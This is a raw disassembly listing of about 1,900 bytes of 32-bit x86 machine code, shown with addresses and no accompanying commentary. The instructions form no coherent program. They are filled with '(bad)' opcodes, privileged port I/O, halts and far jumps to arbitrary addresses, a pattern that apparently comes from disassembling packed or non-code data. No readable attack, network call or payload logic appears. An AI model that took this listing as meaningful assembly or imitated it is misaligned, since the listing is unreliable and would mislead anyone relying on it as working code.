  406955:	add    dl,dl
  406957:	vpperm ymm10,ymm3,ymm0,YMMWORD PTR [ebp+0x1a]
  40695e:	jl     0x406960
  406960:	sub    BYTE PTR [ecx],bh
  406962:	mov    ebp,0x7165080c
  406967:	mov    al,0x94
  406969:	mov    ebx,0xf3b9b49b
  40696e:	dec    edi
  40696f:	mov    bh,0xec
  406971:	mov    ch,0x5
  406973:	xor    edi,DWORD PTR [edi-0x34a2bb99]
  406979:	shl    DWORD PTR [esi-0x2d],cl
  40697c:	mov    cl,0x10
  40697e:	jnp    0x40699e
  406980:	jmp    0xacf80d4b
  406985:	pop    edi
  406986:	xchg   ecx,eax
  406987:	(bad)  
  406988:	cmp    edx,DWORD PTR [ebx-0x29]
  40698b:	xlat   BYTE PTR ds:[ebx]
  40698c:	sub    al,ch
  40698e:	jl     0x406960
  406990:	out    dx,eax
  406991:	bound  edi,QWORD PTR [ecx]
  406993:	popa   
  406994:	adc    esp,DWORD PTR [edi-0x2a4a401]
  40699a:	and    al,0x8a
  40699c:	adc    BYTE PTR [edi],al
  40699e:	push   0x24
  4069a0:	stc    
  4069a1:	pop    edx
  4069a2:	push   edi
  4069a3:	clc    
  4069a4:	gs cs dec ebp
  4069a7:	in     eax,dx
  4069a8:	sbb    DWORD PTR [ecx],eax
  4069aa:	dec    ebp
  4069ab:	and    eax,0x2c8e644a
  4069b0:	mov    dl,0xaf
  4069b2:	loope  0x406a2e
  4069b4:	in     eax,dx
  4069b5:	push   edi
  4069b6:	mov    bl,BYTE PTR [ecx-0x14a9585e]
  4069bc:	push   edx
  4069bd:	jecxz  0x40696b
  4069bf:	and    DWORD PTR [ebp+0x7b],esp
  4069c2:	jno    0x4069a7
  4069c4:	mov    bl,BYTE PTR [ebp-0x71750982]
  4069ca:	sbb    ch,BYTE PTR [esi+eiz*2]
  4069cd:	xchg   ebx,eax
  4069ce:	mul    al
  4069d0:	xchg   edx,eax
  4069d1:	sub    al,0xb8
  4069d3:	push   cs
  4069d4:	outs   dx,DWORD PTR ds:[esi]
  4069d5:	jb     0x406966
  4069d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069d8:	pop    edi
  4069d9:	cmp    eax,0xc7785ee2
  4069de:	not    bh
  4069e0:	or     BYTE PTR [ebp-0x2d01894b],0xdf
  4069e7:	sbb    eax,0x9de56002
  4069ec:	bound  edi,QWORD PTR [esi+0x5035ada2]
  4069f2:	imul   esi,DWORD PTR [ebx+0x315553d5],0xffffff8e
  4069f9:	repz pop ss
  4069fb:	adc    ch,BYTE PTR [edx+ebp*1-0x6eb57ee9]
  406a02:	ret    
  406a03:	hlt    
  406a04:	repnz pop ds
  406a06:	or     al,0x60
  406a08:	xor    dl,bh
  406a0a:	(bad)  
  406a0b:	adc    al,0xa1
  406a0d:	push   esi
  406a0e:	mov    esi,0x1c43f14b
  406a13:	loopne 0x406a5b
  406a15:	and    eax,0xb2467476
  406a1a:	mov    ebp,gs
  406a1c:	lods   eax,DWORD PTR ds:[esi]
  406a1d:	pop    es
  406a1e:	lea    edx,[eax-0x39]
  406a21:	add    ch,bh
  406a23:	push   ebx
  406a24:	clc    
  406a25:	dec    esp
  406a26:	stos   DWORD PTR es:[edi],eax
  406a27:	iret   
  406a28:	xlat   BYTE PTR ds:[ebx]
  406a29:	and    DWORD PTR [ecx-0x7dc9174],0x8773734a
  406a33:	pusha  
  406a34:	sbb    esp,DWORD PTR [ecx]
  406a36:	into   
  406a37:	sbb    BYTE PTR [esi],0x6
  406a3a:	push   cs
  406a3b:	push   ds
  406a3c:	push   esp
  406a3d:	pop    edi
  406a3e:	gs push edi
  406a40:	mov    eax,0xad50e23c
  406a45:	add    al,0xa5
  406a47:	shl    esi,1
  406a49:	mov    ecx,0x980264b
  406a4e:	in     eax,dx
  406a4f:	js     0x406a76
  406a51:	pop    ebx
  406a52:	mov    DWORD PTR [ebp-0x4473949f],ecx
  406a58:	adc    edx,DWORD PTR [bx-0x70]
  406a5c:	(bad)  
  406a5d:	jns    0x406a8f
  406a5f:	fadd   QWORD PTR [ebx-0x4f]
  406a62:	mov    DWORD PTR [bx+di],esp
  406a65:	test   eax,0xaaa39f93
  406a6a:	ror    DWORD PTR [esi+0x2f0ea33f],0xb
  406a71:	add    eax,0x6c953be0
  406a76:	int3   
  406a77:	push   es
  406a78:	stc    
  406a79:	imul   esp
  406a7b:	sub    eax,0x71eab82b
  406a80:	fs pop ss
  406a82:	ja     0x406a4e
  406a84:	mov    bh,0x4d
  406a86:	mov    bl,0x7f
  406a88:	fcom   QWORD PTR [ecx+0x4c5c3682]
  406a8e:	sub    BYTE PTR [ebp+ebp*1-0x2bae7853],dl
  406a95:	popa   
  406a96:	cmp    al,0xd7
  406a98:	pop    ss
  406a99:	popf   
  406a9a:	retf   0x1b38
  406a9d:	inc    ebx
  406a9e:	mov    ebx,?
  406aa0:	pop    esp
  406aa1:	cmp    esi,DWORD PTR [ebx]
  406aa3:	cmp    ch,BYTE PTR [ebx-0xf033b34]
  406aa9:	sti    
  406aaa:	sbb    al,0x7c
  406aac:	jp     0x406af0
  406aae:	push   esp
  406aaf:	fs test edi,ecx
  406ab2:	cmp    edi,DWORD PTR [edi+ecx*1]
  406ab5:	mov    ds:0xc529b099,al
  406aba:	pop    esp
  406abb:	out    0x5a,eax
  406abd:	js     0x406ae6
  406abf:	jl     0x406acc
  406ac1:	ins    DWORD PTR es:[edi],dx
  406ac2:	mov    eax,ds:0xb678db16
  406ac7:	dec    ebx
  406ac8:	jns    0x406add
  406aca:	(bad)  
  406acb:	rcl    DWORD PTR [eax],1
  406acd:	xchg   dl,ch
  406acf:	imul   edx,edi,0x7a8c9fc1
  406ad5:	sub    dh,BYTE PTR [esi]
  406ad7:	rcl    BYTE PTR [ecx+esi*4-0x7f],0xad
  406adc:	xchg   esp,eax
  406add:	scas   eax,DWORD PTR es:[edi]
  406ade:	mov    al,0xb6
  406ae0:	lds    esi,FWORD PTR [eax]
  406ae2:	mov    dl,BYTE PTR [ecx+0x20a81e8]
  406ae8:	daa    
  406ae9:	fstp   st(2)
  406aeb:	ret    
  406aec:	mov    cl,0xb1
  406aee:	or     DWORD PTR [ebp+edi*4-0x16],esi
  406af2:	dec    edx
  406af3:	pop    eax
  406af4:	or     eax,DWORD PTR [ebx]
  406af6:	mov    cl,0x12
  406af8:	and    cl,BYTE PTR [ebp-0x11]
  406afb:	inc    eax
  406afc:	jne    0x406b47
  406afe:	push   ebx
  406aff:	out    0xd,eax
  406b01:	mov    ds:0xe05abb55,al
  406b06:	popf   
  406b07:	push   es
  406b08:	jmp    0xc3bcdad0
  406b0d:	inc    edi
  406b0e:	mov    al,0x9f
  406b10:	aam    0x39
  406b12:	mov    ch,0x3e
  406b14:	fimul  WORD PTR [ebp+0x1c]
  406b17:	jmp    0x7e826524
  406b1c:	test   eax,0xf7a3f893
  406b21:	pop    ebx
  406b22:	dec    ecx
  406b23:	add    DWORD PTR [ecx+0x64],edx
  406b26:	adc    DWORD PTR [esi],esp
  406b28:	cld    
  406b29:	sub    ah,dl
  406b2b:	jecxz  0x406b0e
  406b2d:	leave  
  406b2e:	push   es
  406b2f:	fadd   st,st(5)
  406b31:	cmp    ecx,DWORD PTR [eiz*2+0x687aae5c]
  406b38:	cwde   
  406b39:	inc    ecx
  406b3a:	call   0x75e2:0xc43a197f
  406b41:	pop    edi
  406b42:	jne    0x406b71
  406b44:	imul   edi,DWORD PTR [ebp+0x6b233376],0x852d7b39
  406b4e:	mov    dl,0x2e
  406b50:	std    
  406b51:	stos   DWORD PTR es:[edi],eax
  406b52:	ja     0x406bb1
  406b54:	or     BYTE PTR [ecx-0x4c0466d8],0x97
  406b5b:	or     BYTE PTR [esi+0x173c701d],al
  406b61:	lods   eax,DWORD PTR ds:[esi]
  406b62:	push   ecx
  406b63:	mov    DWORD PTR [ebx-0x6a],edi
  406b66:	fdivr  DWORD PTR [eax]
  406b68:	xlat   BYTE PTR ds:[ebx]
  406b69:	outs   dx,BYTE PTR ds:[esi]
  406b6a:	xor    eax,0xf4c7cb92
  406b6f:	fbld   TBYTE PTR [ebx+0x52b1ffcb]
  406b75:	pop    ss
  406b76:	push   0x92de304
  406b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b7c:	jg     0x406bd7
  406b7e:	xchg   DWORD PTR [edi+eax*1-0x5f],edx
  406b82:	sub    al,0xe
  406b84:	dec    edx
  406b85:	in     eax,dx
  406b86:	sbb    al,0xfc
  406b88:	dec    edx
  406b89:	push   cs
  406b8a:	fisttp DWORD PTR [esi-0x314edca2]
  406b90:	(bad)  
  406b91:	call   0x4612:0xf27f31a
  406b98:	ins    DWORD PTR es:[edi],dx
  406b99:	jnp    0x406bb4
  406b9b:	fsubr  st,st(1)
  406b9d:	aam    0xbf
  406b9f:	mov    WORD PTR [edi+0x1],ds
  406ba2:	sbb    bl,BYTE PTR [esi-0xf]
  406ba5:	fwait
  406ba6:	xor    ch,bh
  406ba8:	or     al,0x1d
  406baa:	xchg   ecx,eax
  406bab:	mov    al,bh
  406bad:	cmp    ch,BYTE PTR [edx+ebx*1+0x4e]
  406bb1:	and    DWORD PTR [edx],eax
  406bb3:	lea    edx,[ebp+0x29]
  406bb6:	ins    BYTE PTR es:[edi],dx
  406bb7:	aam    0x70
  406bb9:	push   esp
  406bba:	sub    al,0x9a
  406bbc:	fist   DWORD PTR [ebp+0x15]
  406bbf:	adc    esp,ecx
  406bc1:	inc    eax
  406bc2:	out    dx,al
  406bc3:	cmp    dl,0xee
  406bc6:	sub    al,0xaf
  406bc8:	push   edx
  406bc9:	mov    cl,al
  406bcb:	adc    BYTE PTR [ebx-0x5e868b6],dl
  406bd1:	std    
  406bd2:	mov    edx,0x769f787
  406bd7:	aad    0xe
  406bd9:	push   0xab021392
  406bde:	stc    
  406bdf:	ret    0xa1ba
  406be2:	sub    bh,0x42
  406be5:	retf   
  406be6:	sbb    eax,0x953d6083
  406beb:	pusha  
  406bec:	mov    esi,0xce00d549
  406bf1:	fild   DWORD PTR [ecx]
  406bf3:	sbb    bh,dl
  406bf5:	mov    ds:0xbcc93cf5,eax
  406bfa:	mov    ah,0x5b
  406bfc:	cs dec edx
  406bfe:	push   ebp
  406bff:	jno    0x406bcf
  406c01:	scas   al,BYTE PTR es:[edi]
  406c02:	xchg   BYTE PTR [ecx+0x3d34e012],cl
  406c08:	std    
  406c09:	cmp    al,dl
  406c0b:	lahf   
  406c0c:	jl     0x406bb8
  406c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c0f:	enter  0x30f5,0x70
  406c13:	js     0x406c72
  406c15:	xor    BYTE PTR [edi],dh
  406c17:	xchg   esi,eax
  406c18:	adc    eax,0x55cfabe9
  406c1d:	nop
  406c1e:	inc    edx
  406c1f:	or     BYTE PTR [esi-0x25150afa],cl
  406c25:	mov    ecx,DWORD PTR [esi+0x2b]
  406c28:	or     BYTE PTR [eax-0x94c157c],al
  406c2e:	and    al,0x9d
  406c30:	retf   
  406c31:	popa   
  406c32:	shl    DWORD PTR [ebp-0x16207ab7],cl
  406c38:	sub    BYTE PTR [ecx+eax*2+0x74],0x50
  406c3d:	pop    ecx
  406c3e:	mov    eax,0x838ff972
  406c43:	pop    edx
  406c44:	inc    edx
  406c45:	imul   ecx,DWORD PTR [ecx+0x5d],0x2914d406
  406c4c:	pop    ecx
  406c4d:	jnp    0x406bdd
  406c4f:	or     eax,0x6ffae936
  406c54:	adc    al,dl
  406c56:	cmp    al,0xf2
  406c58:	out    dx,eax
  406c59:	push   ecx
  406c5a:	mov    esp,0xa6156039
  406c5f:	test   bl,dl
  406c61:	std    
  406c62:	jo     0x406ca6
  406c64:	inc    edx
  406c65:	sar    BYTE PTR [esi],0x2c
  406c68:	aas    
  406c69:	jns    0x406ce1
  406c6b:	xor    eax,0x357054d1
  406c70:	xor    BYTE PTR [edi+0x6b4020a5],bl
  406c76:	and    eax,0x65fce467
  406c7b:	add    cl,bl
  406c7d:	mov    esi,0x4405a351
  406c82:	cmp    cl,0xc8
  406c85:	rol    BYTE PTR [esi+0x51af9fd5],cl
  406c8b:	stc    
  406c8c:	cmova  ebx,DWORD PTR [ecx-0x78]
  406c90:	dec    edi
  406c91:	loope  0x406c9d
  406c93:	stos   DWORD PTR es:[edi],eax
  406c94:	push   0xa64c7638
  406c99:	(bad)  
  406c9a:	jmp    0xc353b71a
  406c9f:	fwait
  406ca0:	pop    ds
  406ca1:	in     al,dx
  406ca2:	or     edx,DWORD PTR ss:[ebp-0x6f]
  406ca6:	fdivr  st,st(6)
  406ca8:	dec    ebx
  406ca9:	cld    
  406caa:	lahf   
  406cab:	outs   dx,DWORD PTR ds:[esi]
  406cac:	call   0x7b137706
  406cb1:	push   esi
  406cb2:	mov    ah,0x37
  406cb4:	shr    BYTE PTR ds:[ebx-0x68],0xdc
  406cb9:	addr16 pushf 
  406cbb:	mov    ecx,DWORD PTR [esi+0x2c]
  406cbe:	out    dx,al
  406cbf:	sbb    dh,BYTE PTR [esp+eiz*8+0x2cd89ee9]
  406cc6:	cmp    edx,ebp
  406cc8:	sbb    al,BYTE PTR [edi+0x72]
  406ccb:	adc    ecx,0x36
  406cce:	push   ebp
  406ccf:	push   ebp
  406cd0:	mov    al,ds:0x211f88fb
  406cd5:	dec    ecx
  406cd6:	add    al,0xa6
  406cd8:	stos   DWORD PTR es:[edi],eax
  406cd9:	(bad)  
  406cda:	jge    0x406d45
  406cdc:	sti    
  406cdd:	mov    cl,0x23
  406cdf:	js     0x406cf1
  406ce1:	xor    esp,DWORD PTR [eax-0x17]
  406ce4:	fs int 0x90
  406ce7:	pop    edi
  406ce8:	cdq    
  406ce9:	call   0xe34e74f6
  406cee:	test   BYTE PTR [ecx+0x1b100c7e],0x1f
  406cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cf6:	or     bl,0x6f
  406cf9:	jge    0x406d32
  406cfb:	xor    DWORD PTR fs:[ecx-0x4312150c],0xffffff84
  406d03:	push   0xffffffb4
  406d05:	outs   dx,BYTE PTR ds:[esi]
  406d06:	push   ss
  406d07:	std    
  406d08:	mov    edx,0x2ef857f9
  406d0d:	adc    eax,0xa750a749
  406d12:	xchg   ebp,eax
  406d13:	push   edx
  406d14:	test   eax,0xbf28e86e
  406d19:	adc    dl,0x13
  406d1c:	aaa    
  406d1d:	stc    
  406d1e:	je     0x406d1a
  406d20:	mov    ecx,esp
  406d22:	sbb    eax,0x9625edfe
  406d27:	dec    DWORD PTR [edi-0x76]
  406d2a:	js     0x406cf7
  406d2c:	mov    eax,ds:0xdfceff5d
  406d31:	lock arpl cx,bx
  406d34:	inc    DWORD PTR [esi]
  406d36:	lods   eax,DWORD PTR ds:[esi]
  406d37:	mov    WORD PTR [ecx+0x5e],es
  406d3a:	dec    edi
  406d3b:	mov    ecx,0xb4ad2a9c
  406d40:	mov    ds:0x23a4f334,eax
  406d45:	dec    edi
  406d46:	ins    BYTE PTR es:[edi],dx
  406d47:	mov    edx,0x4ace5d41
  406d4c:	js     0x406ce9
  406d4e:	gs sbb ebx,DWORD PTR cs:[edx-0x48f9e280]
  406d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d57:	int    0xd1
  406d59:	popf   
  406d5a:	fist   WORD PTR [ebx+0x3b]
  406d5d:	cmp    esi,DWORD PTR [esi+eax*8+0x373b47b1]
  406d64:	les    edi,FWORD PTR [ebp-0x556271d]
  406d6a:	mov    al,0xd9
  406d6c:	cmp    edx,edi
  406d6e:	or     cl,cl
  406d70:	out    0x3d,eax
  406d72:	jno    0x406dd9
  406d74:	pop    ebp
  406d75:	mov    ss,WORD PTR [ecx+0x1d]
  406d78:	les    esi,FWORD PTR [edi-0xfe79910]
  406d7e:	in     al,dx
  406d7f:	and    eax,esp
  406d81:	jo     0x406d06
  406d83:	add    eax,0x4d025208
  406d88:	leave  
  406d89:	mov    esp,0x1ed1207
  406d8e:	fdiv   st(6),st
  406d90:	out    dx,al
  406d91:	ror    bl,0xc9
  406d94:	ja     0x406dc8
  406d96:	fcom   st(7)
  406d98:	dec    ebp
  406d99:	fld    QWORD PTR [esi-0x18bbcc54]
  406d9f:	inc    ebx
  406da0:	repnz xor DWORD PTR [eax+0x6d],0x3ad52ceb
  406da8:	sbb    dh,ah
  406daa:	(bad)  
  406dab:	adc    ecx,DWORD PTR [eax+0x349f2446]
  406db1:	push   eax
  406db2:	xchg   ebp,eax
  406db3:	mov    DWORD PTR [edx-0x5ae7ee2d],ecx
  406db9:	xor    eax,0xf871a180
  406dbe:	and    ah,BYTE PTR [ebx-0x4f]
  406dc1:	xchg   edi,eax
  406dc2:	(bad)  
  406dc4:	rcl    esp,0xb2
  406dc7:	lahf   
  406dc8:	cmp    ch,BYTE PTR [eax+0x5ab8d6f4]
  406dce:	clc    
  406dcf:	add    DWORD PTR [esi+0x6d895030],ebx
  406dd5:	inc    eax
  406dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd7:	lods   eax,DWORD PTR ds:[esi]
  406dd8:	test   bl,cl
  406dda:	arpl   WORD PTR [ebx+ebx*1+0x5e],di
  406dde:	jne    0x406d9b
  406de0:	mov    dl,ch
  406de2:	inc    ecx
  406de3:	or     eax,0xb1bccae5
  406de8:	addr16 add al,0xec
  406deb:	inc    ebp
  406dec:	xchg   esp,eax
  406ded:	xor    BYTE PTR [ebx+edx*2],ah
  406df0:	(bad)  [ebx]
  406df2:	mov    al,cs:0xa52425a5
  406df8:	retf   
  406df9:	push   ebp
  406dfa:	(bad)  
  406dfb:	in     al,dx
  406dfc:	cld    
  406dfd:	iret   
  406dfe:	in     al,dx
  406dff:	jmp    0xb39a:0x2c8ac49c
  406e06:	xchg   ebx,eax
  406e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e08:	sbb    al,0xd0
  406e0a:	test   DWORD PTR [ebp+0x285893de],eax
  406e10:	mov    ebp,0x22beddce
  406e15:	mov    ecx,eax
  406e17:	jne    0x406e21
  406e19:	add    DWORD PTR [ebx],esi
  406e1b:	xchg   DWORD PTR [ecx-0x4e],esp
  406e1e:	in     eax,dx
  406e1f:	std    
  406e20:	jb     0x406e23
  406e22:	out    dx,eax
  406e23:	sbb    cl,bh
  406e25:	nop
  406e26:	add    edx,esp
  406e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e29:	fucomip st,st(6)
  406e2b:	dec    esp
  406e2c:	mov    eax,0x3f7d8dde
  406e31:	ret    
  406e32:	xor    BYTE PTR [eax+0x6e],dl
  406e35:	mov    al,BYTE PTR [edx+edx*8+0x1ec48825]
  406e3c:	xchg   edi,eax
  406e3d:	lds    ecx,FWORD PTR [ebx-0x32]
  406e40:	imul   esi,DWORD PTR [edi],0xaa074465
  406e46:	sahf   
  406e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e48:	sub    BYTE PTR [ecx+0x5c],ah
  406e4b:	daa    
  406e4c:	sub    DWORD PTR [eax-0x7335f93e],ebp
  406e52:	out    0xd5,eax
  406e54:	sub    ch,cl
  406e56:	pusha  
  406e57:	dec    edi
  406e58:	fimul  WORD PTR [ecx]
  406e5a:	stos   BYTE PTR es:[edi],al
  406e5b:	inc    edi
  406e5c:	data16 aaa 
  406e5e:	dec    ebp
  406e5f:	add    BYTE PTR [ebp+0x64cff318],bl
  406e65:	and    eax,0xc4e121bb
  406e6a:	push   ds
  406e6b:	or     eax,ebp
  406e6d:	sub    DWORD PTR [eax],ecx
  406e6f:	and    eax,0x1ed64151
  406e74:	sub    DWORD PTR [ecx],ebx
  406e76:	xchg   ebx,eax
  406e77:	ss cpuid 
  406e7a:	mov    bh,0x25
  406e7c:	lock shl DWORD PTR ds:[edi],1
  406e80:	sub    BYTE PTR [edi-0x78],0xfb
  406e84:	(bad)  
  406e85:	scas   al,BYTE PTR es:[edi]
  406e86:	dec    ecx
  406e87:	sub    al,0x37
  406e89:	xor    BYTE PTR [ebx-0x54],ch
  406e8c:	sub    bl,bl
  406e8e:	inc    ebp
  406e8f:	loop   0x406ecb
  406e91:	jge    0x406e76
  406e93:	mov    BYTE PTR [ebx-0x66],ch
  406e96:	xchg   edi,eax
  406e97:	jecxz  0x406e2e
  406e99:	fimul  DWORD PTR [ebx]
  406e9b:	xchg   ecx,eax
  406e9c:	popa   
  406e9d:	ss adc al,0xf8
  406ea0:	mov    edi,DWORD PTR [esi+0x5b77058c]
  406ea6:	mov    ch,0x12
  406ea8:	inc    ebp
  406ea9:	fsubp  st(6),st
  406eab:	mov    cl,0xe
  406ead:	cmp    bh,bh
  406eaf:	(bad)  
  406eb1:	neg    BYTE PTR ds:0x6d481e2f
  406eb7:	je     0x406f0e
  406eb9:	mov    edx,0xaac5bf7
  406ebe:	iret   
  406ebf:	jmp    0xd20966a2
  406ec4:	cmp    esi,DWORD PTR [ecx+0x43]
  406ec7:	hlt    
  406ec8:	mov    al,ah
  406eca:	jl     0x406f0c
  406ecc:	iret   
  406ecd:	sub    eax,0x4441f25
  406ed2:	ins    BYTE PTR es:[edi],dx
  406ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ed4:	xor    bh,ch
  406ed6:	cmp    BYTE PTR [eax-0x3],cl
  406ed9:	pusha  
  406eda:	ret    
  406edb:	test   al,0xd2
  406edd:	add    bl,BYTE PTR [esi-0x1e7fd6e6]
  406ee3:	dec    esi
  406ee4:	jg     0x406f49
  406ee6:	inc    edi
  406ee7:	and    eax,0x179947e6
  406eec:	out    dx,al
  406eed:	xchg   DWORD PTR [esi-0x13e9c07c],edi
  406ef3:	push   esp
  406ef4:	les    ebx,FWORD PTR [eax]
  406ef6:	rep lods al,BYTE PTR ds:[esi]
  406ef8:	dec    eax
  406ef9:	ja     0x406ea1
  406efb:	ret    
  406efc:	push   0xfffffff3
  406efe:	das    
  406eff:	sub    eax,DWORD PTR [eax-0x4b]
  406f02:	inc    edx
  406f03:	cwde   
  406f04:	cmp    edi,DWORD PTR [edi]
  406f06:	sbb    cl,cl
  406f08:	(bad)  
  406f09:	(bad)  
  406f0a:	daa    
  406f0b:	sub    BYTE PTR [ebp-0x58d0daae],cl
  406f11:	xchg   ebp,eax
  406f12:	imul   ebp,DWORD PTR [ebp-0x28],0xffffffe2
  406f16:	in     al,dx
  406f17:	arpl   WORD PTR [ebx-0x58],bp
  406f1a:	lods   al,BYTE PTR ds:[esi]
  406f1b:	or     eax,0xdb4fa241
  406f20:	mov    ebx,ebx
  406f22:	into   
  406f23:	mov    eax,0xb67969d7
  406f28:	ja     0x406ec9
  406f2a:	es retf 0xc6ae
  406f2e:	pop    cx
  406f30:	jp     0x406f18
  406f32:	push   eax
  406f33:	dec    ebx
  406f34:	(bad)  
  406f35:	xor    BYTE PTR [ebp+0x18f9b210],bh
  406f3b:	fist   WORD PTR [edi-0x5e]
  406f3e:	push   edi
  406f3f:	push   ss
  406f40:	jl     0x406f1d
  406f42:	xchg   ecx,eax
  406f43:	ins    DWORD PTR es:[edi],dx
  406f44:	xor    al,0x81
  406f46:	outs   dx,BYTE PTR ds:[esi]
  406f47:	aad    0xc0
  406f49:	hlt    
  406f4a:	addr16 das 
  406f4c:	or     bh,BYTE PTR [edi-0x66]
  406f4f:	pop    esp
  406f50:	into   
  406f51:	dec    eax
  406f52:	mov    bl,0x32
  406f54:	fdivrp st(2),st
  406f56:	mov    bl,cl
  406f58:	and    ebx,DWORD PTR [eax]
  406f5a:	fcom   st(4)
  406f5c:	imul   edx,DWORD PTR [ecx-0x1f1284b4],0xbe39f68c
  406f66:	ja     0x406f16
  406f68:	js     0x406f89
  406f6a:	push   esp
  406f6b:	int    0xbc
  406f6d:	imul   edi,DWORD PTR [edx+0x7d],0xffffffac
  406f71:	xor    al,0xa0
  406f73:	xchg   edx,eax
  406f74:	mov    cl,0xa5
  406f76:	int    0x9a
  406f78:	pop    esi
  406f79:	inc    edi
  406f7a:	sub    al,0x72
  406f7c:	stos   DWORD PTR es:[edi],eax
  406f7d:	imul   ebx,DWORD PTR [eax-0x378b304a],0x67
  406f84:	adc    dh,BYTE PTR [eax+0x56]
  406f87:	pop    esp
  406f88:	push   eax
  406f89:	mov    ebx,0x9b9a6250
  406f8e:	and    dh,bl
  406f90:	gs mov al,0x51
  406f93:	aaa    
  406f94:	and    al,0xc7
  406f96:	adc    BYTE PTR [edx],ch
  406f98:	add    DWORD PTR [edi+0x475d11a3],esi
  406f9e:	mov    eax,ds:0xbbe2c8e9
  406fa3:	test   al,0x56
  406fa5:	push   es
  406fa6:	push   edx
  406fa7:	rcl    edi,cl
  406fa9:	ds (bad) 
  406fab:	inc    ebp
  406fac:	inc    esi
  406fad:	sahf   
  406fae:	mov    dh,0x8c
  406fb0:	dec    ecx
  406fb1:	inc    esi
  406fb2:	pop    ds
  406fb3:	punpckhwd mm7,mm5
  406fb6:	test   edi,0xe1eb3278
  406fbc:	mov    ebx,0x1490d69d
  406fc1:	retf   0x6387
  406fc4:	sub    al,0x13
  406fc6:	ds aam 0x8
  406fc9:	fwait
  406fca:	xchg   edi,eax
  406fcb:	mov    edx,0x364c396a
  406fd0:	adc    esi,DWORD PTR [esi]
  406fd2:	sbb    eax,0x8738e244
  406fd7:	dec    ebx
  406fd8:	es nop
  406fda:	inc    esp
  406fdb:	std    
  406fdc:	mov    esi,0x102049c8
  406fe1:	imul   eax,esi,0x216b21d0
  406fe7:	scas   al,BYTE PTR es:[edi]
  406fe8:	lds    edi,FWORD PTR [esi]
  406fea:	lds    esp,FWORD PTR [esi+ebx*4]
  406fed:	add    DWORD PTR [ebx+0x6395878e],0xa7d3b53f
  406ff7:	ja     0x406fcb
  406ff9:	inc    edx
  406ffa:	xor    eax,0x991c40b3
  406fff:	jae    0x40705f
  407001:	adc    eax,0x5c3cd4e6
  407006:	push   0x9
  407008:	pop    edi
  407009:	cmp    dl,BYTE PTR [ebp-0x5a08bab3]
  40700f:	xor    edx,0xd26f613e
  407015:	pop    esp
  407016:	or     DWORD PTR [edx-0x5e20d00a],edi
  40701c:	fidiv  WORD PTR [esi+ecx*1-0x64]
  407020:	pop    ecx
  407021:	std    
  407022:	pop    ds
  407023:	int3   
  407024:	rol    DWORD PTR [eax],1
  407026:	pushf  
  407027:	repnz add DWORD PTR [edx+0x6d],esi
  40702b:	mov    dl,0x6a
  40702d:	not    DWORD PTR [edi-0x47]
  407030:	pop    es
  407031:	cdq    
  407032:	into   
  407033:	jb     0x407062
  407035:	(bad)  
  407036:	dec    esp
  407037:	in     al,0xa3
  407039:	mov    edi,0x8fac9ffc
  40703e:	push   esi
  40703f:	test   DWORD PTR [edx+eax*4+0x2e],ebx
  407043:	push   0x3128222f
  407048:	fcom   QWORD PTR [edx+0x603dd4ac]
  40704e:	iret   
  40704f:	xchg   edx,eax
  407050:	pusha  
  407051:	loopne 0x407017
  407053:	stos   DWORD PTR es:[edi],eax
  407054:	daa    
  407055:	or     dl,BYTE PTR [ebp+ebx*1+0x61fdbc6c]
  40705c:	xor    ch,BYTE PTR [ebp-0x2e]
  40705f:	rol    BYTE PTR [esi],cl
  407061:	imul   ecx,edx,0x65
  407064:	out    0x5f,al
  407066:	push   esp
  407067:	imul   eax,DWORD PTR [ebx-0x74fa0b20],0x71538a29
  407071:	push   es
  407072:	mov    al,0xba
  407074:	les    eax,FWORD PTR [edx+0x236de913]
  40707a:	(bad)  
  40707b:	clc    
  40707c:	add    al,0x17
  40707e:	add    al,0xc7
  407080:	adc    DWORD PTR [eax],0xfad77694
  407086:	cli    
  407087:	sub    DWORD PTR [ecx-0x3],edx
  40708a:	sbb    DWORD PTR [ecx-0x24],ebx
  40708d:	imul   BYTE PTR [edx-0x1384c367]
  407093:	clc    
  407094:	fidivr WORD PTR [esi-0x8849192]
  40709a:	add    al,BYTE PTR ds:0x9b89f80e
  4070a0:	loop   0x4070a9
  4070a2:	mov    eax,0x707fc060
  4070a7:	jne    0x4070f1
  4070a9:	mov    ah,0x69
  4070ab:	leave  
  4070ac:	cmc    
  4070ad:	stos   DWORD PTR es:[edi],eax
  4070ae:	not    eax
  4070b0:	pop    esp
  4070b1:	jne    0x407132
  4070b3:	sbb    DWORD PTR [edi-0x47],0x75b31e77
  4070ba:	or     DWORD PTR [edx],0x7a0fb91a
  4070c0:	push   ds
  4070c1:	adc    bl,ah
  4070c3:	cmp    al,0x5c
  4070c5:	sti    
  4070c6:	mov    dh,0xd8
  4070c8:	mov    esp,0xb2b5250a
  4070cd:	xchg   ebp,eax
  4070ce:	stos   DWORD PTR es:[edi],eax
  4070cf:	(bad)  
  4070d0:	(bad)  
  4070d1:	push   ebx
  4070d2:	call   0x756c28be
  4070d7:	pop    ds
  4070d8:	das    
  4070d9:	iret   
  4070da:	jle    0x40708c
  4070dc:	lods   eax,DWORD PTR ds:[esi]
  4070dd:	in     al,0x13
  4070df:	fisttp WORD PTR [esi-0x20]
  4070e2:	add    DWORD PTR [ebp+0x39],ecx
  4070e5:	sub    al,0x5d
  4070e7:	adc    al,0x80
  4070e9:	push   es
  4070ea:	ds mov cl,0x97
  4070ed:	lods   eax,DWORD PTR ds:[esi]
  4070ee:	frstor [ebp-0x2bb452cc]
  4070f4:	scas   eax,DWORD PTR es:[edi]
  4070f5:	mov    ch,0x8f
  4070f7:	xchg   DWORD PTR [ecx],ebp
  4070f9:	pop    esp
  4070fa:	sbb    eax,DWORD PTR [edi]
  4070fc:	aaa    
  4070fd:	outs   dx,DWORD PTR ds:[esi]
  4070fe:	xchg   edi,eax
  4070ff:	cmp    eax,0x31278593
  407104:	lock leave 
  407106:	push   eax
  407107:	sub    edi,esp
  407109:	(bad)  
  40710a:	loopne 0x407158
  40710c:	push   ebx
  40710d:	inc    ecx
